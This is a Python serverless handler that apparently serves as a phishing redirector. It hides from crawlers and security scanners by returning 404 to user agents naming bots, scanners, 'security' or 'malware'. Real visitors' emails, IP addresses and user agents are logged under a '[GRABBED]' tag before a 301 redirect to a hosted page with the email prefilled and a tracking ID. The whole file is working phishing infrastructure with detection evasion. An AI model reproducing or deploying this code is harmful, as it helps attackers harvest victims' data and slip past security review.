from http import HTTPStatus
import uuid
import datetime

TARGET_URL = "https://candid-lebkuchen-7ff898.netlify.app/?email="

BLOCKED_UA_KEYWORDS = [
    "bot", "crawler", "spider", "curl", "wget", "python", "requests", "scrapy",
    "selenium", "phantomjs", "headless", "zgrab", "nmap", "nuclei", "httpx",
    "go-http", "facebookexternalhit", "twitterbot", "googlebot", "bingbot",
    "slurp", "duckduckbot", "baiduspider", "yandex", "semrush", "ahrefs",
    "mj12bot", "virus", "scanner", "security", "malware"
]

def is_bot(user_agent):
    if not user_agent:
        return True
    ua = user_agent.lower()
    return any(keyword in ua for keyword in BLOCKED_UA_KEYWORDS)

def handler(event, context):
    headers = event.get('headers', {})
    user_agent = headers.get('user-agent', '')

    if is_bot(user_agent):
        return {"statusCode": 404, "body": "Not found"}

    path = event.get('path', '')
    unique_id = path.split('/r/')[-1].split('?')[0].split('/')[0]

    query_params = event.get('queryStringParameters') or {}
    email = query_params.get('email') or 'none'

    click_id = str(uuid.uuid4())
    ip = event.get('headers', {}).get('client-ip', 'unknown')
    ref = event.get('headers', {}).get('referer', 'Direct')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if email and email != 'none':
        log_entry = f"[{timestamp}] ClickID:{click_id} | UniqueID:{unique_id} | IP:{ip} | Email:{email} | UA:{user_agent}\n"
        print(f"[GRABBED] {email} | ClickID: {click_id} | Log: {log_entry.strip()}")

    separator = "&" if "?" in TARGET_URL else "?"
    final_link = f"{TARGET_URL}{email}{separator}click={click_id}&uid={unique_id}"

    return {
        "statusCode": 301,
        "headers": {"Location": final_link},
        "body": ""
    }
